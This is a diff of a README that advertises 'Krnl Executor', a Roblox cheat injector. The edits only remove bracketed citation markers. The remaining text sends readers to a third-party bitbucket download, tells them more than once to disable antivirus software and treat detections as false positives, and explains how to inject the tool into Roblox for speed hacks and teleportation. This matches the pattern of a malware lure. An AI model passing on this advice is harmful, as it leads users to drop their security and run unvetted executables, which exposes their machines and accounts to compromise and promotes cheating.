@@ -6,7 +6,7 @@
 
 ### 🔍 What is Krnl Executor?
 
-Krnl Executor is a powerful and free script executor for Roblox, renowned for its stability and efficiency. Developed by Ice Bear, Krnl allows users to run complex scripts, enhancing gameplay with features like teleportation, speed hacks, and more. Its compatibility with various scripts makes it a favorite among the Roblox community.([Krnl][3])
+Krnl Executor is a powerful and free script executor for Roblox, renowned for its stability and efficiency. Developed by Ice Bear, Krnl allows users to run complex scripts, enhancing gameplay with features like teleportation, speed hacks, and more. Its compatibility with various scripts makes it a favorite among the Roblox community.
 
 ---
 
@@ -16,7 +16,7 @@ Krnl Executor is a powerful and free script executor for Roblox, renowned for it
 * **High Stability:** Minimal crashes ensure a smooth experience.
 * **Wide Script Compatibility:** Supports complex scripts like Owl Hub.
 * **Regular Updates:** Stays up-to-date with Roblox patches.
-* **User-Friendly Interface:** Easy to navigate, even for beginners.([APKPure.com][4], [GitHub][1], [Krnl][3], [SourceForge][2])
+* **User-Friendly Interface:** Easy to navigate, even for beginners.
 
 ---
 
@@ -26,7 +26,7 @@ Krnl Executor is a powerful and free script executor for Roblox, renowned for it
 2. **Disable Antivirus:** Temporarily turn off antivirus software to prevent false positives.
 3. **Extract Files:** Use extraction tools like WinRAR to unpack the downloaded files.
 4. **Launch Krnl:** Open the Krnl application and follow on-screen instructions.
-5. **Inject into Roblox:** Start Roblox, join a game, and click 'Inject' in Krnl to begin scripting.([Krnl][5], [Krnl][3])
+5. **Inject into Roblox:** Start Roblox, join a game, and click 'Inject' in Krnl to begin scripting.
 
 ---
 
@@ -46,13 +46,13 @@ Krnl stands out for its balance of performance and accessibility, making it idea
 
 ### 🛡️ Is Krnl Executor Safe?
 
-While Krnl is widely used and trusted, it's essential to download it from reputable sources like [rotools.bitbucket.io](https://rotools.bitbucket.io). Always disable antivirus software during installation to prevent false flags. Remember, using any script executor carries risks, including potential Roblox account bans. Use responsibly.([Krnl][7])
+While Krnl is widely used and trusted, it's essential to download it from reputable sources like [rotools.bitbucket.io](https://rotools.bitbucket.io). Always disable antivirus software during installation to prevent false flags. Remember, using any script executor carries risks, including potential Roblox account bans. Use responsibly.
 
 ---
 
 ### 🔄 Regular Updates and Support
 
-Krnl's development team ensures the executor stays compatible with the latest Roblox updates. For support and community discussions, users often refer to forums and Discord channels dedicated to Roblox scripting.([SourceForge][2])
+Krnl's development team ensures the executor stays compatible with the latest Roblox updates. For support and community discussions, users often refer to forums and Discord channels dedicated to Roblox scripting.
 
 ---
 
